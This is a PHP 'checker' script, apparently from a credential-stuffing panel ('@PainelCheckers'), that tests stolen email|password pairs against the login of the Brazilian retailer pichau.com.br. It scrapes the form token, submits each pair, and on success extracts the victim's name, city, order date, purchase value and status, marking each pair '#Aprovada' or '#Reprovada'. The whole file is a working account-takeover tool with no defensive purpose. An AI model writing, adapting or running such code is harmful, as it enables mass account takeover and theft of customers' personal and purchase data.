<?php



error_reporting(0);
DeletarCookies();

extract($_GET);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}



$lista = str_replace(" ", "", $lista);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];


$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://www.pichau.com.br/customer/account/login/"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_POST, 0); 

$end = curl_exec($ch); 

$token = getStr($end, '<input name="form_key" type="hidden" value="', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.pichau.com.br/customer/account/loginPost/');
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.pichau.com.br',
'content-type: application/x-www-form-urlencoded',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'

));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_key='.$token.'&login%5Busername%5D='.$email.'&login%5Bpassword%5D='.$senha.'&send=');
$end = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, "https://www.pichau.com.br/customer/account/"); 
curl_setopt($ch, CURLOPT_POST, 0); 
$end = curl_exec($ch); 

$saldo = getStr($end, '<span class="price">', '</span>');
$status = getStr($end, '<td data-th="Status" class="status">', '</td>');
$nome = getStr($end, '<td data-th="Enviar para" class="shipping">', '</td>');
$cidadeES = getStr($end, '<address><br>', '<br>');
$Pedido = getStr($end, '<td data-th="Encontro" class="date">', '</td>');

if(strpos($end, 'Sair    	<') !== false) {
	echo '<b><span class="badge badge-success" style="color: lime;">#Aprovada</span> <span style="color: #274e13;">'.$email.'</span> <span style="color: #274e13;">'.$senha.'</span> <span style="color: red;">|Nome:</span> <span style="color: #274e13;">'.$nome.'</span> <span style="color: red;">|Cidade-ES:</span><span style="color: lime;"> </span><span style="color: #274e13;">'.$cidadeES.'</span> <span style="color: red;">|Pedido DATA:</span> <span style="color: #274e13;">'.$Pedido.'</span> <span style="color: red;">|Valor da compra:</span> <span style="background-color: white;"><span style="color: blue;">'.$saldo.'</span> </span><span style="color: red;">|Status:</span> <span style="color: #274e13;">'.$status.'</span> <span class="badge badge-success" style="color: lime;">| @PainelCheckers |</span>';

} else {
	 echo '<span style="color: red;">#Reprovada '.$email.' '.$senha.'</span>';
}




?>
